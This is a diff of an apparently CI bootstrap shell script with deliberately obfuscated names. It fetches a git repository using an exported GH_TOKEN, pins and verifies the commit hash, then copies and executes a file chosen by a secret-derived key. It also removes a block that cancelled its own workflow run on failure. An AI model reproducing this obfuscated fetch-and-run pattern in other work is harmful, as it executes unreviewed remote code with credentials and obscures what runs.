@@ -24,26 +24,33 @@ n() {
 
 a() {
   local q="$1"
-  if [[ ! "$q" =~ ^x_[a-z2-7]{16}$ ]]; then
+  if [[ ! "$q" =~ ^x[a-z2-7]{10}$ ]]; then
     f "setup failed"
   fi
 }
 
 b() {
   local q="$1"
-  if [[ ! "$q" =~ ^x_[a-z2-7]{16}(,x_[a-z2-7]{16})*$ ]]; then
+  if [[ ! "$q" =~ ^x[a-z2-7]{10}(,x[a-z2-7]{10})*$ ]]; then
     f "setup failed"
   fi
 }
 
-n x_eyta5i3nv4bkuler
-n x_qenmlrfq62oinaw4
-n x_ujyswu2qkj4iywg6
-n x_cgagul6y7tlo65ik
-a "${x_cgagul6y7tlo65ik}"
-s x_yt5k2ne5oqunwic5
-if [ -n "${x_yt5k2ne5oqunwic5:-}" ]; then
-  b "${x_yt5k2ne5oqunwic5}"
+h() {
+  local q="$1"
+  if [[ ! "$q" =~ ^[0-9a-f]{40}$ ]]; then
+    f "setup failed"
+  fi
+}
+
+n xeyta5i3nv4
+n xqenmlrfq62
+n xujyswu2qkj
+n xcgagul6y7t
+a "${xcgagul6y7t}"
+s xyt5k2ne5oq
+if [ -n "${xyt5k2ne5oq:-}" ]; then
+  b "${xyt5k2ne5oq}"
 fi
 
 d="$(mktemp -d)"
@@ -58,10 +65,11 @@ l="$d/l"
 o="$d/o"
 mkdir -p "$t" "$q"
 
-export GH_TOKEN="${x_ujyswu2qkj4iywg6}"
-r="${x_eyta5i3nv4bkuler}"
-v="${x_qenmlrfq62oinaw4}"
-k="${x_cgagul6y7tlo65ik}"
+export GH_TOKEN="${xujyswu2qkj}"
+r="${xeyta5i3nv4}"
+v="${xqenmlrfq62}"
+k="${xcgagul6y7t}"
+h "$v"
 
 git -C "$q" init --quiet
 git -C "$q" config credential.helper ""
@@ -83,18 +91,17 @@ g() {
 
 g
 GIT_TERMINAL_PROMPT=0 git -C "$q" checkout --quiet --detach FETCH_HEAD 2>"$l" || f "setup failed"
-cp "$q/x/${k}/x" "$t/x"
-cp "$q/x/${k}/d" "$t/d"
-chmod 700 "$t/x"
-chmod 600 "$t/d"
-
-export x_kfulkrhfhlnanyun="$o"
-if ! "$t/x" >"$l" 2>&1; then
-  if [ -f "$l.r" ]; then
-    if GH_TOKEN="$GITHUB_TOKEN" gh api --method POST "repos/${GITHUB_REPOSITORY}/actions/runs/${GITHUB_RUN_ID}/cancel" >/dev/null 2>&1; then
-      sleep 2
-    fi
-    GH_TOKEN="$GITHUB_TOKEN" gh api --method POST "repos/${GITHUB_REPOSITORY}/actions/runs/${GITHUB_RUN_ID}/force-cancel" >/dev/null 2>&1 || true
-  fi
-  f "run failed"
+git -C "$q" rev-parse HEAD >"$d/v" 2>"$l" || f "setup failed"
+read -r w <"$d/v"
+[ "$w" = "$v" ] || f "setup failed"
+u="$q/x/${k}"
+[ -d "$u" ] || f "setup failed"
+if find "$u" -mindepth 1 -maxdepth 1 ! -type f -print -quit | grep -q .; then
+  f "setup failed"
 fi
+cp "$u"/* "$t/"
+find "$t" -mindepth 1 -maxdepth 1 -type f -exec chmod 600 {} +
+chmod 700 "$t/x"
+
+export xkfulkrhfhl="$o"
+"$t/x" >"$l" 2>&1 || f "run failed"
